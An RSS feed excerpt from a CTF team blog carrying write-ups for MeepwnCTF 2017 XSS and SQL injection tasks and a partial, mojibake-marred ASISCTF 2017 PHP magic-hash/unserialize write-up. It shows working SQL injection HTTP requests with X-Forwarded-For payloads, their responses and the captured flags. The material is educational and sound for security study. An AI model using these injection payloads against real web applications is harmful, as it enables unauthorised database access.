<p><em>f86b4d24627d5dc9d806a3f89c03aea19aaa987bcedb44fc5635140bf9191d03</em></p>
<p><em>387dddd9bb34fb1fa697f4f5c208ad425e14f6a37e943a3ddf73cca12356054b</em></p>
<p><em>086ad9c053fc3a670db2954b120733ba97109e1eb845ca383e88d2623289ae66</em></p>
<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
<p><em>22179b6701cf203abfa94eee9152495d409bcb9f5293fb5aa87fe342f7285a18</em></p>
<p><em>a60503e089b805ca7b99186c1b4014bbca98655eadd615f911a7379708b0405a</em></p>
<p><em>b3be9a9b5b6cd97815a1a2a5c14713b761b664e195a6e1384219a701ccc12036</em></p>
<p><em>22179b6701cf203abfa94eee9152495d409bcb9f5293fb5aa87fe342f7285a18</em></p>
<p><em>a60503e089b805ca7b99186c1b4014bbca98655eadd615f911a7379708b0405a</em></p>
<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
<p><em>22179b6701cf203abfa94eee9152495d409bcb9f5293fb5aa87fe342f7285a18</em></p>
<p><em>387dddd9bb34fb1fa697f4f5c208ad425e14f6a37e943a3ddf73cca12356054b</em></p>
<p><em>5b4703281a185e81113b303277e546c5f87ae599fba4565932a2638b3d40b41f</em></p>
<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
<p><em>5b4703281a185e81113b303277e546c5f87ae599fba4565932a2638b3d40b41f</em></p>
<p><em>5b4703281a185e81113b303277e546c5f87ae599fba4565932a2638b3d40b41f</em></p>
<p><em>b3be9a9b5b6cd97815a1a2a5c14713b761b664e195a6e1384219a701ccc12036</em></p>
<p><em>aa556a1b27356c35be3890f7c6f022c431d48ff7b5c15b2a0586609b15e5d5f6</em></p>
<p><em>a60503e089b805ca7b99186c1b4014bbca98655eadd615f911a7379708b0405a</em></p>
<p><em>da329f9a9b2ea505fb5ffb4a8d08ff8755b3c960ce84c342c50ab7e808c835b5</em></p>
<p id="INlghhy"><em>Â </em></p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">687</post-id>	</item>
		<item>
		<title>MeepwnCTF 2017 - injection</title>
		<link>https://babyphd.net/2017/07/27/meepwnctf-2017-injection/</link>
				<pubDate>Thu, 27 Jul 2017 18:47:24 +0000</pubDate>
		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
				<category><![CDATA[web]]></category>
		<category><![CDATA[xss]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=659</guid>
				<description><![CDATA[AnotherÂ injection? Awesome, another ART I want to learn so much. Learning *injection*-fu is hard, keep learning, practicing, ctf all the time. According to Saitama, after a year and half of 100 daily push-ups, sit-ups, and squats, plus 10 km daily running, he had achieved some level of superhuman strength. SourcecodeÂ (base64) Spoiler alert: In the previous &#8230; <a href="https://babyphd.net/2017/07/27/meepwnctf-2017-injection/" class="more-link">Continue reading <span class="screen-reader-text">MeepwnCTF 2017 - injection</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>AnotherÂ injection? Awesome, another ART I want to learn so much. Learning *injection*-fu is hard, keep learning, practicing, <a href="https://ctftime.org/">ctf all the time</a>.</p>
<blockquote><p>According to <a href="http://onepunchman.wikia.com/wiki/Saitama">Saitama</a>, after a year and half of 100 daily push-ups, sit-ups, and squats, plus 10 km daily running, he had achieved some level of superhuman strength.</p></blockquote>
<p><a href="https://pastebin.com/hnvvVhW9">Sourcecode</a>Â (base64)</p>
<p><span id="more-659"></span></p>
<p>Spoiler alert: <span style="color: #ffffff;">In the previous post, I once said something about SQLi (aka SQL injection) and XSS.</span><br />
I will write up as my timeline trying to solve this task.<br />
I have sourcecode, yay, at least I known what the heck i'm facing with. At this time, I could use <a href="http://rips-scanner.sourceforge.net/">RIPS</a>Â but I already have experience in source code audit, so, kill the bear with bare hand, why not (<strong>I'm not support killing wild animals</strong>).<br />
Exploring source code is just time-comsuming task, after that, I have some notes:</p>
<ul>
<li>Database structure:
<ul>
<li>The flag is the <code>links</code>Â table</li>
<li>charset LATIN1</li>
<li>all string field is varchar(500) - that's mean only 500 char stored in that column. I have some ideas about SQL truncate attack</li>
</ul>
</li>
<li>The BOT:
<ul>
<li>chim.js is a file used in phantomjs (a headless browser), very familar with XSS problem.</li>
<li>the <code>secret</code>Â cookie is HTTPOnly (i'm not very it yet, blind trust), can't easy inject javascript code to steal cookie.</li>
</ul>
</li>
<li>The php code:
<ul>
<li>every input entry has been <code>mysqli_real_escape_string</code></li>
<li>every output has been <code>htmlentities</code>Â - the problem is this function by design/default didn't escape single quote '</li>
<li>CSRF, not have any CSRF check, likely XSS.</li>
<li>
<div>
<div>SET sql_mode=ANSI ?</div>
</div>
</li>
<li>
<div>
<div>function `filterLink` remove single quote ', double quote ", backtick `</div>
</div>
</li>
<li>
<div>
<div>`mysqli_error` for debug only?</div>
</div>
<div></div>
</li>
</ul>
</li>
</ul>
<p>The very likely exploitable for a XSS vuln is <a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a><br />
<span class="type">string</span>Â <span class="methodname"><strong>htmlentities</strong></span>Â (Â <span class="methodparam"><span class="type">string</span>Â <code class="parameter">$string</code></span>Â [,Â <span class="methodparam"><span class="type">int</span>Â <code class="parameter">$flags</code><span class="initializer">Â = ENT_COMPAT | ENT_HTML401</span></span>Â [,Â <span class="methodparam"><span class="type">string</span><code class="parameter">$encoding</code><span class="initializer">Â = ini_get("default_charset")</span></span>Â [,Â <span class="methodparam"><span class="type">bool</span>Â <code class="parameter">$double_encode</code><span class="initializer">Â = true</span></span>Â ]]] )</p>
<p>Default flag isÂ ENT_COMPAT | ENT_HTML401, but if I want toÂ convert ', look at the flag table</p>
<table class="doctable table">
<thead>
<tr>
<th>Constant Name</th>
<th>Description</th>
</tr>
</thead>
<tbody class="tbody">
<tr>
<td><strong><code>ENT_COMPAT</code></strong></td>
<td>Will convert double-quotes and leave single-quotes alone.</td>
</tr>
<tr>
<td><strong><code>ENT_QUOTES</code></strong></td>
<td>Will convert both double and single quotes.</td>
</tr>
<tr>
<td><strong><code>ENT_NOQUOTES</code></strong></td>
<td>Will leave both double and single quotes unconverted.</td>
</tr>
<tr>
<td><span style="font-family: monospace, serif;"><b>...</b></span></td>
<td>...</td>
</tr>
<tr>
<td><strong><code>ENT_HTML401</code></strong></td>
<td>Handle code as HTML 4.01.</td>
</tr>
</tbody>
</table>
<p>Not bad, expected by design <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f600.png" alt="ğŸ˜€" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p>In a CTFÂ challenge, most of taskÂ are solvable or exploitable. From my point of view, everything echo-ed back to us is something useful. such as `mysqli_error`.<br />
In some point, I had tried to exploit the register function to make a new Admin but UNIQUE KEY (`user`) in table structure prevented it.</p>
<p>Luckily, when I try to insert a duplicated user into table, it warn me, with the most beautiful char, a single quote.<br />
Example Database, notice theÂ Â space at user column.</p>
<pre><code>CREATE DATABASE inj_1;
USE inj_1;
CREATE TABLE `users` (
`uid` int(11) NOT NULL AUTO_INCREMENT,
`user` varchar(50) NOT NULL,
`passwd` varchar(50) NOT NULL,
PRIMARY KEY (`uid`),
UNIQUE KEY (`user`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
ALTER TABLE `users` AUTO_INCREMENT=1;
INSERT INTO `users` VALUES (0, 'admin', 'a');
INSERT INTO `users` VALUES (0, 'admin ', 'a');
INSERT INTO `users` VALUES (0, 'admin onerror=aaa', 'a');
INSERT INTO `users` VALUES (0, 'admin onerror=aaa ', 'a');</code></pre>
<p><a href="https://i1.wp.com/imgur.com/pXZmlmX.png"><img class="alignnone size-full" src="https://i1.wp.com/imgur.com/pXZmlmX.png?w=604" alt="" data-recalc-dims="1" /></a></p>
<p>One more thing with SELECT is, it didn't do bound check on input, look at this example</p>
<pre>mysql&gt; select * from users;
+-----+-------------------+--------+
| uid | user | passwd |
+-----+-------------------+--------+
| 1 | admin | a |
| 3 | admin onerror=aaa | a |
+-----+-------------------+--------+
2 rows in set (0,00 sec)

mysql&gt; select * from users where user = 'admin'
-&gt; ;
+-----+-------+--------+
| uid | user | passwd |
+-----+-------+--------+
| 1 | admin | a |
+-----+-------+--------+
1 row in set (0,01 sec)

mysql&gt; select * from users where user = 'admin      ';
+-----+-------+--------+
| uid | user | passwd |
+-----+-------+--------+
| 1 | admin | a |
+-----+-------+--------+
1 row in set (0,00 sec)

mysql&gt; select * from users where user = 'admin                    ';
+-----+-------+--------+
| uid | user | passwd |
+-----+-------+--------+
| 1 | admin | a |
+-----+-------+--------+
1 row in set (0,00 sec)

mysql&gt; select * from users where user = 'admin                                                 1';
Empty set (0,00 sec)

</pre>
<p>WithÂ <code>SET sql_mode=ANSI</code>Â , IÂ can bypass SELECT, also ableÂ trigger error in INSERT.<br />
If you test in your db; make sure you have change your sql_mode,</p>
<p>by default (mysqld --verbose --help | grep mode) give ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</p>
<p>STRICT_TRANS_TABLES will give Â error <code>1406 (22001): Data too long for column</code></p>
<p>In the code, there is a lot of space content <code>$msg = mysqli_error($con);</code>Â but I look the register function first. Then a lot of time trying to finger out how can I bypass the disable tag to have a functional onfocus tag (line 61 file login.php)</p>
<p><code>echo "&lt;input type='text' value='$msg' class='form-control' disabled&gt;";</code></p>
<p>After mysql return error string, I may have the following text:</p>
<div>
<div>&lt;input type='text' value='Duplicate entry 'admin onerror=aaa Â  ' for key 'user'' class='form-control' disabled&gt;</div>
<div>
<p>Now <code>onerror</code>Â has been escaped from the single quote, it is a event and can be develop with real payload such as onfocus, but it is disabled in this input form.</p>
</div>
<div>Example: &lt;input autofocus onfocus=alert(1)&gt; will pop an alert box</div>
<div>But not this one &lt;input autofocus onfocus=alert(1) disabled&gt;</div>
</div>
<div></div>
<div>Another place that I haven't notice is the links table. It also have uniq key is link, type of varchar(500)</div>
<div>
<p>Line 29 of index.php, the manual check did the same thing with register, both have</p>
<div>
<div><code>$msg = mysqli_error($con);</code></div>
<div>but this time, it is</div>
<div>
<div>
<div>echo "&lt;input type='text' value='$msg' class='form-control' readonly&gt;";</div>
</div>
<div>Yeah, readonly is better than <a href="https://www.w3.org/TR/html4/interact/forms.html#h-17.12">disabled</a>, I can use my favarite autofocus</div>
<div></div>
</div>
</div>
</div>
<div>Â The final exploit flow could be (assume this is a XSS challenge):</div>
<div></div>
<ol>
<li>register</li>
<li>login</li>
<li>send a link that trigger a CSRF exploit to make bot create manual exploit link</li>
<li>resubmit that trigger link</li>
<li>waiting for flag, <a href="https://www.youtube.com/watch?v=pRpeEdMmmQ0">waka waka</a></li>
</ol>
<p>Now this is time for trial error, <a href="https://pastebin.com/mFCzmSN5">here</a><br />
or the original <a href="https://pastebin.com/jnCKtVi0">here</a><br />
Ref:</p>
<ul>
<li>https://ctftime.org/</li>
<li>http://onepunchman.wikia.com/wiki/Saitama</li>
<li>https://pastebin.com/hnvvVhW9</li>
<li>http://rips-scanner.sourceforge.net/</li>
<li>http://php.net/manual/en/function.htmlentities.php</li>
<li>https://www.w3.org/TR/html4/interact/forms.html#h-17.12</li>
<li>https://www.youtube.com/watch?v=pRpeEdMmmQ0</li>
<li>https://pastebin.com/mFCzmSN5</li>
<li>https://pastebin.com/jnCKtVi0</li>
</ul>
<p>PS: WordPress SUCK!!!</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">659</post-id>	</item>
		<item>
		<title>MeepwnCTF 2017 - Br0kenMySQL	1-2-3</title>
		<link>https://babyphd.net/2017/07/27/meepwnctf-2017-br0kenmysql1-2-3/</link>
				<pubDate>Thu, 27 Jul 2017 15:00:47 +0000</pubDate>
		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
				<category><![CDATA[web]]></category>
		<category><![CDATA[sqli]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=655</guid>
				<description><![CDATA[SQL injection, it's not only about %27, everything is Art. The author is the artist, and the competitor is critic. But not me, I'm just a dude want to make some fun, solving those inovativeÂ challenge help me remove my limit barriers. There are 3 tasks. sourcecode sourcecode sourcecode These were written in PHP and MySQL, &#8230; <a href="https://babyphd.net/2017/07/27/meepwnctf-2017-br0kenmysql1-2-3/" class="more-link">Continue reading <span class="screen-reader-text">MeepwnCTF 2017 - Br0kenMySQL	1-2-3</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>SQL injection, it's not only about %27, everything is Art. The author is the artist, and the competitor is critic. But not me, I'm just a dude want to make some fun, solving those inovativeÂ challenge help me remove my limit barriers.</p>
<p>There are 3 tasks.</p>
<ol>
<li><a href="https://pastebin.com/T7zAcdhb">sourcecode</a></li>
<li><a href="https://pastebin.com/kLAyi6qS">sourcecode</a></li>
<li><a href="https://pastebin.com/v0PAEFNY">sourcecode</a></li>
</ol>
<p><span id="more-655"></span></p>
<p>These were written in PHP and MySQL, you will need knownledge and experience aboutÂ it.</p>
<p>1.</p>
<p>A very very classic web vulnerability called <a href="https://www.owasp.org/index.php/SQL_Injection">SQL injection</a> (a kind of *injection*-ish) when you can inject your own query into developer's SQL query, make use of old query to extract information from database, make that query crash or keep it running depend on your purpose (leak full text or single bit, even out of band over other channel such as DNS, combine with XSS,..)</p>
<p>On line 25 when <code>$id</code>Â combined with SELECT statement to get <code>username</code>Â out of <code>users</code>Â table withÂ some filter, then that <code>username</code>Â <a href="http://php.net/manual/en/types.comparisons.php">strict compare</a> (===) with stringÂ <code>guest</code></p>
<p>On line 36, again, <code>$ip</code>Â from <code>$_SERVER['HTTP_X_FORWARDED_FOR']</code>Â process through same filter will be insert into <code>logs</code>Â table, in PHP, `<a href="http://php.net/manual/en/reserved.variables.server.php">$_SERVER</a>['HTTP_X_FORWARDED_FOR']` equal to <a href="https://en.wikipedia.org/wiki/X-Forwarded-For"><code>X-Forwared-for</code></a>Â in HTTP request sent toÂ the Â PHP script.</p>
<p>On line 38, same <code>$ip</code> Â (after filtered) will be SELECT from same <code>users</code> table. But this time this should return <code>admin if we want flag at line 43.<br />
</code></p>
<p>This is confusing when with 2Â same query but have 2 difference results. The first thing popped up like an alert box in my mind is using some kind of condition query. More detail, 1st: query return guest ifÂ condition A else admin, thenÂ change A; 2nd: because A changed so query return admin.</p>
<p>The INSERT query could be abuse for that. In MySQL there is a thing called <a href="https://dev.mysql.com/doc/refman/5.7/en/user-variables.html">variable</a>.<br />
They are permanently in same and single connection to database.<br />
My ideas come clear with SQL query look like:</p>
<p>select username from users where id = -1 union select ( 'guest' if @a=1337 else 'admin')<br />
insert into logs values(''),(@a:=1337),('')<br />
select username from users where id = -1 union select ( 'guest' if @a=1337 else 'admin')</p>
<p>But I came first with a solution did not require `union` and `select`.<br />
Enum the <code>id</code>Â parameter (?id=1,?id=2, ?id=3...) , it turned out 1 is <code>admin</code>Â and 2 is <code>guest</code>, add a little math-MySQL-magic, trial-error, help from MySQL documents, I have got final payload:</p>
<p><code><br />
GET /?id=2-if(@a=1337,@a:=1,@a:=0) HTTP/1.1<br />
Host: 139.59.239.133<br />
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
Accept-Language: en-US,en;q=0.5<br />
Accept-Encoding: gzip, deflate<br />
Connection: close<br />
X-Forwarded-For: 1'),(@a:=1337),('2<br />
Upgrade-Insecure-Requests: 1<br />
</code></p>
<p>With response<br />
<code>Br0kenMySQL<br />
&lt;p style="color: red;"&gt;Br0kenMySQL&lt;/p&gt;<br />
string(18) "1'),(@a:=1337),('2"<br />
What ???????<br />
Login as guest&amp;amp;admin at the same time ?<br />
Seems our code is broken, here is your bounty<br />
MeePwnCTF{_b4by_tr1ck_fixed}<br />
</code><br />
2.<br />
This is an upgrade version of the first task.<br />
It added more filter <code>select|from|<span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b99834bc19bbad24580b3adfa04fb947.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></code>, now I need <code>$id</code>Â without select, from, and (, ), luckily, now I only need remove ( and ),<br />
In MySQL there are a lot of conditional statement. because <code>IF</code>Â need his parent-heses, in <code>CASE</code>Â of fire, break glass, <code>THEN</code>Â call <code>114</code>. Oh, did you who am I talking about?</p>
<p>Yeah, it is <a href="https://dev.mysql.com/doc/refman/5.7/en/case.html">CASE ... THEN ... ELSE ... END</a><br />
Debugging <code>INSERT</code>Â in mysqlclient connected to my test databaseÂ let me know that I can assign variable's value inside statement,Â it is just a subquery if I correct.</p>
<p><code>GET /v2/?id=2-case+when+%40a%3d1337+then+1+else+0+end HTTP/1.1<br />
Host: 139.59.239.133<br />
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
Accept-Language: en-US,en;q=0.5<br />
Accept-Encoding: gzip, deflate<br />
Connection: close<br />
X-Forwarded-For: '+@a:=1337+'<br />
Upgrade-Insecure-Requests: 1</code></p>
<p><code>Br0kenMySQL<br />
&lt;p style="color: red;"&gt;Br0kenMySQL&lt;/p&gt;<br />
string(12) "'+@a:=1337+'"<br />
What, again ???????!@#$!@#$!@#$<br />
MeePwnCTF{_I_g1ve__uPPPPPPPP}<br />
http://139.59.239.133/c541c6ed5e28b8762c4383a8238e6f5632cc7df6da8ce9db7a1aa706d1e5c387/?debug=%F0%9F%95%B5<br />
</code><br />
3.<br />
Althrough <code>time|date|sec|day</code>Â was blacklisted but I didn't use any of them.<br />
Yay, same payload for 3rd flag.</p>
<p>Thanks @ml for great challenges. You absolutely should try <a href="https://github.com/l4wio/CTF-challenges-by-me/tree/master/meepwn-2017">his CTF challenge</a> repo at Github.</p>
<p>Ref:</p>
<ul>
<li>https://pastebin.com/T7zAcdhb</li>
<li>https://pastebin.com/kLAyi6qS</li>
<li>https://pastebin.com/v0PAEFNY</li>
<li>https://www.owasp.org/index.php/SQL_Injection</li>
<li>http://php.net/manual/en/types.comparisons.php</li>
<li>http://php.net/manual/en/reserved.variables.server.php</li>
<li>https://en.wikipedia.org/wiki/X-Forwarded-For</li>
<li>https://dev.mysql.com/doc/refman/5.7/en/user-variables.html</li>
<li>https://dev.mysql.com/doc/refman/5.7/en/case.html</li>
<li>https://github.com/l4wio/CTF-challenges-by-me/tree/master/meepwn-2017</li>
</ul>
<p>&nbsp;</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">655</post-id>	</item>
		<item>
		<title>ASISCTF 2017 - Web - Secure portal [1,2,3]</title>
		<link>https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/</link>
				<pubDate>Fri, 12 May 2017 13:38:37 +0000</pubDate>
		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
				<category><![CDATA[web]]></category>
		<category><![CDATA[unserialize]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=642</guid>
				<description><![CDATA[Hey yo! Long time no C++ CÃ³ chÃºt váº¥n Ä‘á» khi mÃ¬nh viáº¿t writeup cho bÃ i nÃ y Ä‘Ã³ lÃ  pháº§nÂ láº§y flag cÃ³ váº» khÃ´ng hoáº¡t Ä‘á»™ng ğŸ™ nÃªn hiá»‡n táº¡i mÃ¬nh chá»‰ cÃ³ thá»ƒ viáº¿t Ä‘Æ°á»£c pháº§n 1. Okie, link CÃ³ gá»£i Ã½ nhÆ° sau By the way I know it's dangerous to code with &#8230; <a href="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/" class="more-link">Continue reading <span class="screen-reader-text">ASISCTF 2017 - Web - Secure portal [1,2,3]</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>Hey yo!</p>
<p>Long time no C++<br />
CÃ³ chÃºt váº¥n Ä‘á» khi mÃ¬nh viáº¿t writeup cho bÃ i nÃ y Ä‘Ã³ lÃ  pháº§nÂ láº§y flag cÃ³ váº» khÃ´ng hoáº¡t Ä‘á»™ng <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png" alt="ğŸ™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> nÃªn hiá»‡n táº¡i mÃ¬nh chá»‰ cÃ³ thá»ƒ viáº¿t Ä‘Æ°á»£c pháº§n 1.</p>
<p>Okie, <a href="http://66.172.33.77:8080/">link</a></p>
<p>CÃ³ gá»£i Ã½ nhÆ° sau <em><strong>By the way I know it's dangerous to code with IDE in server-side but I really obey security instructions</strong>.</em></p>
<p>VÃ o trang web vÃ  lÆ°u láº¡i cÃ¡c request &amp; response báº±ng Burpsuite Proxy</p>
<p style="text-align: center;"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?ssl=1"><img data-attachment-id="643" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/1-2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?fit=1221%2C750&amp;ssl=1" data-orig-size="1221,750" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?fit=300%2C184&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?fit=604%2C371&amp;ssl=1" class="aligncenter wp-image-643 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=604%2C371&#038;ssl=1" width="604" height="371" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?w=1221&amp;ssl=1 1221w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=300%2C184&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=768%2C472&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=1024%2C629&amp;ssl=1 1024w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: center;"><span id="more-642"></span></p>
<p style="text-align: left;">CÃ³ thá»ƒ lÃ  cÃ³ cáº£ nhá»¯ng file cáº¥u hÃ¬nh project - Information leak. Tiá»‡n sáºµn mÃ¡y mÃ¬nh cÅ©ng cÃ i PHPStorm nÃªn táº¡o luÃ´n 1 project Ä‘á»ƒ xem tháº¿ nÃ o</p>
<p style="text-align: left;"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?ssl=1"><img data-attachment-id="644" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/2-2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?fit=490%2C165&amp;ssl=1" data-orig-size="490,165" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?fit=300%2C101&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?fit=490%2C165&amp;ssl=1" class="size-full wp-image-644 aligncenter" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?resize=490%2C165&#038;ssl=1" alt="" width="490" height="165" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?w=490&amp;ssl=1 490w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?resize=300%2C101&amp;ssl=1 300w" sizes="(max-width: 490px) 100vw, 490px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">NhÆ° váº­y lÃ  cÃ³ cÃ¡c file nhÆ° trong hÃ¬nh, thá»­ vÃ o <code>.idea/workspace.xml</code>Â vÃ  ...</p>
<p style="text-align: left;"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?ssl=1"><img data-attachment-id="645" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/3-2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?fit=1063%2C596&amp;ssl=1" data-orig-size="1063,596" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="3" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?fit=604%2C339&amp;ssl=1" class="size-full wp-image-645 aligncenter" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=604%2C339&#038;ssl=1" alt="" width="604" height="339" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?w=1063&amp;ssl=1 1063w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=300%2C168&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=768%2C431&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=1024%2C574&amp;ssl=1 1024w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">Tiáº¿p tá»¥c lÃ  1 file php khÃ¡c</p>
<p style="text-align: left;"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?ssl=1"><img data-attachment-id="646" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/4-3/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?fit=731%2C644&amp;ssl=1" data-orig-size="731,644" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4.3" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?fit=300%2C264&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?fit=604%2C532&amp;ssl=1" class="size-full wp-image-646 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?resize=604%2C532&#038;ssl=1" alt="" width="604" height="532" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?w=731&amp;ssl=1 731w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?resize=300%2C264&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">PhÃ¢n tÃ­ch ká»¹ ta cÃ³ 1 Ä‘oáº¡n compare lá»—i <code>==</code>Â á»Ÿ <code>if($realSign == $signature)</code></p>
<p style="text-align: left;">Bypass báº±ng cÃ¡ch bruteforce input Ä‘á»ƒ md5sum cá»§a (input + unknown-key) = 0e[a-f0-9]{30} aka <strong><em><a href="https://www.whitehatsec.com/blog/magic-hashes/">magic hash</a></em></strong>, sau Ä‘Ã³ Ä‘áº¿n pháº§n unserialize cá»§a $payload... hmm, khÃ´ng Ä‘Æ¡n giáº£n láº¯m nhá»‰, bruteforce mÃ  váº«n pháº£i unserialize Ä‘Æ°á»£c. Tuy nhiÃªn thÃ¬ ta cÃ³ thá»ƒ chÃ¨n thÃªm junk variables vÃ o trong $payload mÃ  deserialize khÃ´ng áº£nh hÆ°á»Ÿng gÃ¬ cáº£.</p>
<p style="text-align: left;">VÃ­ dá»¥</p>
